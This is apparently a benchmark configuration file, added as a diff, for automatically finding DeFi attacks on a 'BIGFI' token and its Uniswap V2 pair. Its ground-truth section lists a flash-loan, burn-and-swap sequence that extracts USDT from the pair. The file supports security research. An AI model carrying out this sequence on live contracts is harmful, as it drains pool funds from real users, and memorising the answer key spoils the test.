@@ -1,0 +1,57 @@
+project_name: "BIGFI"
+
+# Abstract name of a DeFi contract and its class name.
+ctrt_name2cls:
+  - ["bigfi", "BIGFI"]
+  - ["usdt", "USDT"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+# For contract deployment
+ctrt_name2deploy:
+  - [
+      "bigfi",
+      "new BIGFI(owner, 'Big finance', 'BIGFI', 18, 10000e18, [1, 1, 1], [uint256(4), uint256(4), uint256(4), uint256(50)], 0x602546D439EA254f3372c3985840750C6B9c6dDB)",
+    ]
+  - ["usdt", ""]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+
+extra_actions:
+  - "function burn_pair_bigfi(uint256 amount) internal {
+    bigfi.burn(amount);
+    }"
+
+extra_deployments: []
+
+extra_constraints: []
+
+attack_goal: "usdt.balanceOf(attacker) >= 1e18"
+
+groundtruth:
+  - ["borrow", "usdt", "200000e18"]
+  - ["swap", "pair", "usdt", "bigfi", "usdt.balanceOf(attacker)"]
+  - ["burn", "pair", "bigfi", "20999908387035301038233287"]
+  - ["swap", "pair", "bigfi", "usdt", "bigfi.balanceOf(attacker)"]
+  - ["payback", "usdt", "200600e18"]
+
+roles:
+  "usdt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "bigfi":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+  "pair":
+    is_swappair: true
+    uniswap_order: ["usdt", "bigfi"]
+    support_swaps:
+      "usdt": ["usdt", "bigfi"]
+      "bigfi": ["usdt", "bigfi"]
+    is_oracle: true
+
+pattern: "Token Burn"
